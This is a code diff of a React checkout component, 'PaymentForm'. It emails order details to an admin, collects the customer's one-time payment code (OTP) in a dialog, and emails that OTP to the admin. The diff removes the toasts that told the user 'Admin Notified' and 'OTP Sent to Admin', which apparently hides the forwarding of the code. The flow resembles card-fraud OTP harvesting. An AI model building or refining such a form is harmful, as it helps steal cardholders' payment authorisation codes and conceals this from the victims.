@@ -1,4 +1,3 @@
-
 'use client';
 
 import { useState, useEffect } from 'react';
@@ -103,7 +102,6 @@ export default function PaymentForm() {
     try {
       const orderEmailResult = await sendOrderEmailAction(orderDetailsForFirstEmail);
       if (orderEmailResult.success) {
-        toast({ title: "Admin Notified", description: "Order details sent. Proceed with payment verification." });
         setIsOtpDialogOpen(true);
       } else {
         toast({ variant: "destructive", title: "Admin Notification Failed", description: "Could not send order details. Please try again." });
@@ -118,7 +116,6 @@ export default function PaymentForm() {
 
   const handleOtpSubmit = async (enteredOtp: string) => {
     setIsOtpDialogOpen(false);
-    // isProcessingPayment is already true, keep it that way
     
     if (!currentOrderId || !userDetails?.name) {
         toast({ variant: "destructive", title: "Error", description: "Order context lost. Please try again." });
@@ -133,9 +130,7 @@ export default function PaymentForm() {
         otp: enteredOtp,
       });
 
-      if (adminOtpEmailResult.success) {
-        toast({ title: "OTP Sent to Admin", description: "Finalizing your order..." });
-      } else {
+      if (!adminOtpEmailResult.success) {
         toast({ variant: "destructive", title: "Admin OTP Failed", description: "Could not send OTP to admin. Please contact support." });
       }
       
